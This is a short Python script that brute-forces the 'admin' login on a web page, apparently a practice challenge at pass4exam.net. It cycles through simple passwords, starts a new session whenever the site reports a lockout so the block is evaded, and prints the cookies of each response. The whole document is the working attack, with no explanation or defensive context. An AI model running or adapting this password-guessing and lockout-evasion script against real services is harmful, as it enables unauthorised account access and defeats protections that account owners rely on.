import requests

headers = {'User-Agent': 'Mozilla/5.0'}
URL = 'https://pass4exam.net/challenge/'

sessions = requests.session()

def check(r):
    global sessions
    if r.content.find(b'Username or password is error') != -1:
        print('Username or password is error')
    elif r.content.find(b'You have been blocked, Try again after 1 hour') != -1:
        sessions = requests.session()
        print('blocked')
    elif r.content.find(b'Welcome') != -1:
        print('success')

for counter in range(1,17):
    try:
        if counter < 16:
            password = str(counter)
        else:
            password = 'admin'
        r = sessions.post(URL, headers=headers, data={'user': 'admin','pass': password,'start': 'Login'})
        check(r)
        print(r.cookies.get_dict())
    except:
        print("error")